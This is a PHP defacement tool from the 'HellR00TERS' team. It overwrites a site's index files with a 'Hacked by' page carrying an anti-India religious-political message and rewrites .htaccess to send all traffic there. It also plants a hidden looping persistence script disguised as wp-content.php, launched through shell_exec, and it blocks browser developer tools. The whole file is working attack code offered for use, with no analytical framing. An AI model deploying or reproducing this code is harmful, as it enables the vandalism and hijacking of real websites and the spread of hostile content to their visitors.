<?php
// ULTIMATE PROTECTION - HELLR00TERS TEAM
error_reporting(0);
ini_set('display_errors', 0);

// ==================== DEFACE CONTENT ====================
$DEFACE_HTML = '<!doctype html>
<html lang="id"> 
<head> 
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>HACKED BY HellR00TERS Team</title> 
    <link href="https://fonts.googleapis.com/css2?family=Iceland&amp;display=swap" rel="stylesheet"> 
    <style>
        body {
            background-color: black;
            color: white;
            text-align: center;
            font-family: "Iceland", sans-serif;
            margin: 0;
            padding: 0;
        }
        .title {
            font-size: 3em;
            color: red;
            margin-top: 30px;
        }
        .logo img {
            width: 250px;
            height: 250px;
            border-radius: 50%;
            object-fit: cover;
            margin-top: 20px;
            box-shadow: 0 0 20px red;
        }
        .content {
            font-size: 1.2em;
            margin: 20px 30px;
        }
        .footer {
            margin-top: 30px;
            font-size: 0.9em;
            color: gray;
        }
        audio {
            margin-top: 30px;
        }
    </style> 
</head> 
<body> 
    <h1 class="title">Hacked By HELLR00TERS TEAM</h1> 
    <div class="logo"> 
        <img src="https://g.top4top.io/p_3453skjo43.png" alt="HellR00ters Logo"> 
    </div> 
    <div class="content">
        This site has been  Hacked by <strong style="color:red;"> ./RootXploit1337</strong> 
        <br><br>
        <span style="color:lime;">
        Hey India, hey Indian citizens, stop trampling on my Islamic religion, immediately clarify on Instagram, just like when you first trampled on the Arab Pakistani poster, I will wait for your clarification. #OPINDIA #FUCKINDIA 
        </span> 
    </div> 
    <audio src="https://b.top4top.io/m_3502gr7gh0.mp3" loop autoplay controls></audio> 
    <div class="footer">HELLR00TERS Team Was Here</div> 
    
    <script>
        // Client Protection
        setInterval(function() {
            if (!document.body || document.body.innerHTML.indexOf("HellR00TERS") === -1) {
                location.reload();
            }
        }, 2000);
        
        document.addEventListener("contextmenu", function(e) { e.preventDefault(); });
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false;
        };
    </script>
</body>
</html>';

// ==================== PROTECTION SYSTEM ====================
function protect_site() {
    $main_files = ['index.html', 'index.php', 'default.html'];
    
    foreach ($main_files as $file) {
        if (!file_exists($file) || filesize($file) < 100) {
            file_put_contents($file, $GLOBALS['DEFACE_HTML']);
        }
    }
    
    // Create .htaccess protection
    $htaccess = '
<FilesMatch "\.(bak|backup|old)$">
Order allow,deny
Deny from all
</FilesMatch>
    
RewriteEngine On
RewriteCond %{REQUEST_URI} !\.(css|js|png|jpg|mp3)$ [NC]
RewriteRule ^(.*)$ index.html [L]
    ';
    
    file_put_contents('.htaccess', $htaccess);
}

// ==================== EXECUTE ====================
protect_site();
echo $DEFACE_HTML;

// ==================== BACKGROUND PROTECTION ====================
if (!isset($_GET['no_protect'])) {
    // Simpan protection script tersembunyi
    $protection_script = '<?php
    error_reporting(0);
    while(true) {
        $content = file_get_contents("index.html");
        if(strpos($content, "HellR00TERS") === false) {
            file_put_contents("index.html", \'' . str_replace("'", "\\'", $DEFACE_HTML) . '\');
        }
        sleep(5);
    }
    ?>';
    
    file_put_contents('wp-content.php', $protection_script);
    
    // Jalankan protection di background
    if (function_exists('shell_exec')) {
        @shell_exec('php wp-content.php > /dev/null 2>&1 &');
    }
}
?>